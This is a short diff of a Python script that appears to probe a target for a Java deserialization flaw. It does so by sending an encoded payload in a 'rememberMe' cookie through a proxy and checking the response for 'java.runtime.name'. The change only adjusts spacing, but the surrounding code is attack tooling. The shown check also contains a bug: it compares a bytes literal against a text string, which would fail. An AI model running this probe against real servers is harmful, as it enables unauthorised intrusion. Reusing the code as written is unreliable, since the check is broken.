@@ -23,7 +23,7 @@ def checlvul(codefile,target):
     proxies = {"http": "http://127.0.0.1:8080",}
     headers={"User-agent" : "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0;","echo":"1",}
     r = requests.get(target, cookies={'rememberMe': payload.decode()},headers=headers, timeout=20,proxies=proxies)
-    if r.status_code ==200 and b"java.runtime.name" in r.text:
+    if r.status_code == 200 and b"java.runtime.name" in r.text:
     	print("rememberMe={}".format(payload.decode()))
 
 if __name__ == '__main__':
